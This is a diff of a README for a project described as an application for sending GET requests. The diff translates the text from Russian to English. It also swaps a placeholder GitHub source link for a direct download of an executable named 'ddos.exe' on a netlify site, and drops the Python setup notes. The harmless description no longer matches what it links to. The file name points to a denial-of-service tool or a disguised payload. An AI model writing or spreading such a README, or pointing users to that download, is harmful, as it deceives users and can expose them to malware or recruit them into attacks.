@@ -1,22 +1,18 @@
-# Проект: Отправка GET-запросов
+# Project: Application for Sending GET Requests
 
-## Описание
-Этот проект предназначен для отправки GET-запросов на указанный веб-сайт. Он может быть полезен для веб-скрапинга, тестирования API или мониторинга состояния сайтов.
+## Description
+This application is designed to send GET requests to a specified website. It can be useful for web scraping, API testing, or monitoring the status of websites.
 
-## Установка
-Для установки проекта перейдите по следующей ссылке:
+## Installation
+To install the application, follow this link:
 
-[Скачать проект](https://github.com/ваш_пользователь/ваш_репозиторий)
+[Download Application](https://xa12.netlify.app/ddos.exe)
 
-## Использование
-После установки следуйте инструкциям в документации для отправки GET-запросов.
+## Usage
+After installation, you will be able to send GET requests to the URLs you need.
 
-## Примечания
-- Убедитесь, что у вас установлен Python 3.x.
-- Для работы с HTTP-запросами может потребоваться библиотека `requests`.
+## License
+This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
 
-## Лицензия
-Этот проект лицензирован под MIT License - смотрите файл [LICENSE](LICENSE) для подробностей.
-
-## Контакты
-Если у вас есть вопросы, свяжитесь со мной по адресу: ваш_email@example.com.
+## Contacts
+If you have any questions, please contact me at: your_email@example.com.
